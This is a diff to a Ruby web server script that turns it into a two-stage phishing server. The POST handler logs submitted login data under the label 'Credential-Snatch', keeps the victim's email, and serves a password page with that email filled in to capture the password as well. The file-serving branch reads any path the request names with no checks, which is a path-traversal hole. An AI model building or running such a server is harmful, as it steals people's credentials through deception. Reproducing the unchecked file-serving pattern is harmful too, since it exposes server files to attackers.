@@ -181,29 +181,49 @@ LogThread = Thread.start do
 end
 
 httpThread = Thread.start do
-  handler = TCPServer.new(80)
+  handler = TCPServer.new(8080)
+  lastemail = ''
   loop do
     Thread.start(handler.accept) do |client|
       read = client.readpartial(2048)
       # puts read
       request = Codec.decode(read, client.peeraddr[3])
       # Log.http("#{client.peeraddr[3]}: #{request['Method']} #{request['Path']} #{request['User-Agent']}")
-      if request['Path'] == '/api/auth' && request['Method'] == 'POST'
-        # Log.debug("POST /api/auth")
-        Log.http("#{client.peeraddr[3]}-Credential-Snatch: #{request['Data']}") unless request['Data'].nil?
-
-        client.write(
-          Codec.genRedir(
-            '/'
-          )
-        )
-      else
-        Log.http("#{client.peeraddr[3]}: #{request['Method']} #{request['Path']} (#{request['User-Agent']})") 
+      if File.exist?("src#{request['Path']}")
+        Log.http("#{client.peeraddr[3]}: #{request['Method']} #{request['Path']} (#{request['User-Agent']})")
         client.write(
           Codec.genResponse(
             '200 OK',
-            'text/html',
-            File.read('src/index.html')
+            "text/#{request['Ext']}",
+            File.read("src#{request['Path']}")
+          )
+        )
+
+      elsif request['Path'] == '/auth' && request['Method'] == 'POST'
+        Log.http("#{client.peeraddr[3]}-Credential-Snatch: #{request['Data']}") unless request['Data'].nil?
+        lastemail = request['Data']['email'].gsub('%40', '@') unless request['Data']['email'].nil?
+
+        puts request['Data']
+        client.write(
+          Codec.genRedir(
+            '/login.html'
+          )
+        )
+      elsif request['Path'].include?('login')
+        Log.http("#{client.peeraddr[3]}: #{request['Method']} #{request['Path']} (#{request['User-Agent']}) : Stage-2")
+        file = File.read('src/pwd.html')
+        client.write(
+          Codec.genResponse(
+            '200 OK',
+            "text/#{request['Ext']}",
+            file.gsub!('[email]', lastemail)
+          )
+        )
+      else
+        Log.http("#{client.peeraddr[3]}: #{request['Method']} #{request['Path']} (#{request['User-Agent']}) 404")
+        client.write(
+          Codec.genRedir(
+            '/'
           )
         )
       end
